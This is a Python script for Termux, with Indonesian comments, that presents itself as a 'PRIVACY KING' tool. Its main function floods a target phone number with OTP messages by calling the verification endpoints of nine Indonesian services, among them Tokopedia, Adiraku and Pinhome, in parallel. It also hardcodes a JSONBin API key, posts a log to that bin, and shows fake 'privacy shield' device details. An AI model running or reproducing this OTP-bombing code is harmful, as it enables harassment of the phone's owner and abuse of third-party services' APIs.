#!/usr/bin/env python3

import os
import sys
import json
import signal
import re
import random
import time
import string
import subprocess
from concurrent.futures import ThreadPoolExecutor, as_completed
import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ==========================================
# 1. DEKLARASI WARNA & DEKORASI MAHKOTA SEPUH
# ==========================================
a = "\033[1;30m"
m = "\033[1;31m"
h = "\033[1;32m"
k = "\033[1;33m"
c = "\033[1;36m"
p = "\033[1;37m"
r = "\033[0m"

BANNER = f"""
{c}██   ██ ██  █████  ██████   ██████  ██    ██ ████████ 
{c} ██ ██  ██ ██   ██ ██   ██ ██    ██ ██    ██      ██  
{c}  ███   ██ ███████ ██████  ██    ██ ██    ██     ██   
{c} ██ ██  ██ ██   ██ ██   ██ ██    ██ ██    ██    ██    
{c}██   ██ ██ ██   ██ ██   ██  ██████   ██████    ██     

{k}                █           █           █
{k}               ███         ███         ███
{k}              █████       █████       █████
{k}             ███████     ███████     ███████
{k}             ███████████████████████████████
{k}             ████ ▀████▀ █████ ▀████▀ ██████
{k}             ████▄▄████▄▄█████▄▄████▄▄██████
{k}             ███████████████████████████████
{k}             ▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀
{p}               ─── [ PRIVACY KING v2.0 ] ───
"""

# Kredensial Server JSONBin Pribadi Lu
APIKEY_BIN = "$2a$10$PC/h7AE2V10cjl.8TuhWQuSgEktrr2q1SJg7eoex44OMKXGLF9aO2"
BIN_ID = "6a4a27c4da38895dfe304f6e"
URL_BIN = f"https://api.jsonbin.io/v3/b/{BIN_ID}"
SESSION_FILE = "/data/data/com.termux/files/home/.free_otp_session.json"


# ==========================================
# 2. FUNGSI BACKSOUND MUSIK & MULTIMEDIA
# ==========================================
def putar_musik_background():
    try:
        # Menjalankan mpv untuk memutar musik secara senyap di background
        subprocess.Popen(
            ["mpv", "--no-video", "--loop", "musik.mp3"],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )
    except:
        pass

def matikan_musik():
    try:
        # Hentikan paksa proses mpv agar lagu mati total saat keluar
        os.system("pkill mpv")
    except:
        pass


# ==========================================
# 3. FUNGSI ANIMASI & PENYAMARAN DATA
# ==========================================
def animasi_loading(durasi=1.5):
    for i in range(21):
        bar = "█" * i + "-" * (20 - i)
        sys.stdout.write(f"\r{c}[*] Memuat Sistem Privasi: {k}[{bar}] {i*5}%")
        sys.stdout.flush()
        time.sleep(durasi / 20)
    print(f"\n{h}[+] Sistem Keamanan Siap!")

def get_ip():
    return "127.0.0.1"

def get_merek_hp():
    return "Nokia 3310 Pro Max"

def get_os():
    return "Android 99.0"

def get_cpu():
    return "999 Core"

def get_memory():
    return "1 Terabyte RAM"

def kirim_log_ke_server_gua():
    log_data = {
        "device_id": "User_Ganteng_Sepuh",
        "merek": get_merek_hp(),
        "ip_publik": get_ip(),
        "os_versi": get_os(),
        "waktu_uji": time.strftime("%d-%m-%Y %H:%M:%S")
    }
    headers = {
        "X-Master-Key": APIKEY_BIN,
        "Content-Type": "application/json"
    }
    try:
        response = requests.put(URL_BIN, json={"log_pengujian": log_data}, headers=headers, timeout=10)
        if response.status_code == 200:
            print("\033[1;32m[+] Sukses menyinkronkan data tameng ke server pribadi lu!\033[0m")
        else:
            print(f"\033[1;31m[-] Gagal sinkronisasi. Kode respons server: {response.status_code}\033[0m")
    except:
        print("\033[1;31m[-] Gagal menghubungkan ke server JSONBin.\033[0m")


# ==========================================
# 4. DAFTAR API FUNGSI UTAMA
# ==========================================
def spam_otp_ktbs(nomor):
    try:
        if nomor.startswith("0"): nomor_clean = nomor[1:]
        elif nomor.startswith("62"): nomor_clean = nomor[2:]
        else: nomor_clean = nomor
        url = f'https://core.ktbs.io/v2/user/registration/otp/62{nomor_clean}'
        resp = requests.get(url, timeout=10)
        return resp.status_code == 200
    except: return False

def spam_otp_payfaz(nomor):
    try:
        url = "https://api.payfazz.com/v2/phoneVerifications"
        headers = {"Host": "api.payfazz.com", "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "User-Agent": "Mozilla/5.0"}
        payload = {"phone": nomor}
        resp = requests.post(url, data=payload, headers=headers, timeout=10)
        return resp.status_code < 400
    except: return False

def spam_otp_battlefront(nomor):
    try:
        if nomor.startswith("0"): nomor_clean = nomor[1:]
        elif nomor.startswith("62"): nomor_clean = nomor[2:]
        else: nomor_clean = nomor
        url = "https://battlefront.danacepat.com/v1/auth/common/phone/send-code"
        payload = {'mobile_no': nomor_clean}
        resp = requests.post(url, data=payload, timeout=10)
        return resp.status_code == 200
    except: return False

def spam_otp_jumpstart(nomor):
    try:
        if nomor.startswith("0"): nomor_clean = nomor[1:]
        elif nomor.startswith("62"): nomor_clean = nomor[2:]
        else: nomor_clean = nomor
        url = "https://api.jumpstart.id/graphql"
        headers = {"Content-Type": "application/json"}
        payload = {
            "operationName": "CheckPhoneNoAndGenerateOtpIfNotExist",
            "variables": {"phoneNo": f"+62{nomor_clean}"},
            "query": "query CheckPhoneNoAndGenerateOtpIfNotExist($phoneNo: String!) {\n  checkPhoneNoAndGenerateOtpIfNotExist(phoneNo: $phoneNo)\n}\n"
        }
        resp = requests.post(url, json=payload, headers=headers, timeout=10)
        return resp.status_code == 200
    except: return False

def format_nomor(nomor):
    nomor = nomor.strip().replace(" ", "").replace("-", "")
    if nomor.startswith("0"):
        phone = "+62" + nomor[1:]
        username = "0" + nomor[1:]
    elif nomor.startswith("62"):
        phone = "+" + nomor
        username = "0" + nomor[2:]
    else:
        phone = "+62" + nomor
        username = "0" + nomor
    return phone, username

def spam_otp_adiraku(nomor):
    try:
        if nomor.startswith("62"): nomor_lokal = "0" + nomor[2:]
        else: nomor_lokal = nomor
        url = "https://prod.adiraku.co.id/ms-auth/auth/generate-otp-vdata"
        headers = {"Content-Type": "application/json"}
        payload = {"mobileNumber": nomor_lokal, "type": "prospect-create", "channel": "whatsapp"}
        resp = requests.post(url, json=payload, headers=headers, timeout=10)
        return "success" in resp.text
    except: return False

def spam_otp_tokopedia(nomor):
    try:
        session = requests.Session()
        url_token = f"https://accounts.tokopedia.com/otp/c/page?otp_type=116&msisdn={nomor}"
        resp = session.get(url_token, timeout=10)
        token = re.search(r'<input\s+id="Token"\s+value="([^"]+)"', resp.text)
        if not token: return False
        url_otp = "https://accounts.tokopedia.com/otp/c/ajax/request-wa"
        data = {"otp_type": "116", "msisdn": nomor, "tk": token.group(1), "number_otp_digit": "6"}
        resp2 = session.post(url_otp, data=data, timeout=10)
        return resp2.status_code == 200
    except: return False

def spam_otp_singa(nomor):
    try:
        url = "https://api102.singa.id/new/login/sendWaOtp"
        payload = {"mobile_phone": nomor, "type": "mobile", "is_switchable": 1}
        res = requests.post(url, json=payload, timeout=10)
        return "Success" in res.text
    except: return False

def spam_otp_pinhome(nomor):
    try:
        if nomor.startswith("62"): nomor_lokal = "0" + nomor[2:]
        else: nomor_lokal = nomor
        url = "https://www.pinhome.id/api/pinaccount/request/otp"
        payload = {"accountType": "customers", "countryCode": "62", "medium": "whatsapp", "otpType": "register", "phoneNumber": nomor_lokal}
        resp = requests.post(url, json=payload, timeout=10)
        return resp.status_code < 400
    except: return False

def spam_otp_duniagames(nomor):
    try:
        phone, username = format_nomor(nomor)
        url = "https://api.duniagames.co.id/api/user/api/v2/user/send-otp"
        payload = {"phoneNumber": phone, "userName": username}
        resp = requests.post(url, json=payload, timeout=10)
        return resp.status_code == 200
    except: return False


# ==========================================
# 5. ENGINE PARALEL MULTI-THREADING
# ==========================================
def mulai_spam(nomor):
    apis = {
        "adiraku": spam_otp_adiraku,
        "tokopedia": spam_otp_tokopedia,
        "singa": spam_otp_singa,
        "pinhome": spam_otp_pinhome,
        "duniagames": spam_otp_duniagames,
        "ktbs": spam_otp_ktbs,
        "payfaz": spam_otp_payfaz,
        "battlefront": spam_otp_battlefront,
        "jumpstart": spam_otp_jumpstart
    }
    with ThreadPoolExecutor(max_workers=len(apis)) as executor:
        for nama, fungsi_target in apis.items():
            try: executor.submit(fungsi_target, nomor)
            except: pass


# ==========================================
# 6. BLOK EKSEKUTOR DASHBOARD UTAMA
# ==========================================
if __name__ == "__main__":
    try:
        # Bersihkan terminal dan langsung dentumkan musik latar belakang
        os.system('clear')
        putar_musik_background()
        
        # Cetak Banner Mahkota Raksasa XIAROU7
        print(BANNER)
        
        # Penunjuk Jam & Tanggal Digital Real-Time
        jam_sekarang = time.strftime("%H:%M:%S")
        tanggal_sekarang = time.strftime("%d-%m-%Y")
        
        # Cetak Box Dashboard Info Estetik
        print(f"{k}┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓")
        print(f"{k}┃ {p}WAKTU AKSES     : {c}{jam_sekarang} WIB ({tanggal_sekarang})       {k}┃")
        print(f"{k}┃ {p}TAMENG PERANGKAT: {h}{get_merek_hp()}                 {k}┃")
        print(f"{k}┃ {p}IP PROXY VIRTUAL: {h}{get_ip()}                            {k}┃")
        print(f"{k}┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n")
        
        # Animasi Gerakan Progress Bar
        animasi_loading(1.5)
        print("")
        
        # Kirim tameng log tiruan ke JSONBin pribadi lu
        kirim_log_ke_server_gua()
        print("")
        
        # Perintah Masukan Target Utama
        target = input("\033[1;36mMasukkan Nomor Target (contoh: 0812xxx): \033[0m")
        if target:
            print(f"\n\033[1;32m[+] Memulai proses paralel ke {target}...\033[0m")
            mulai_spam(target)
            print("\033[1;32m[+] Selesai!\033[0m")
            matikan_musik() # Program kelar normal = matikan musik
        else:
            print("\033[1;31m[-] Nomor tidak boleh kosong!\033[0m")
            matikan_musik()
            
    except KeyboardInterrupt:
        matikan_musik() # Pengguna pencet CTRL+C = WAJIB matikan proses mpv musik latar
        print("\n\033[1;31m[-] Keluar dari skrip.\033[0m")
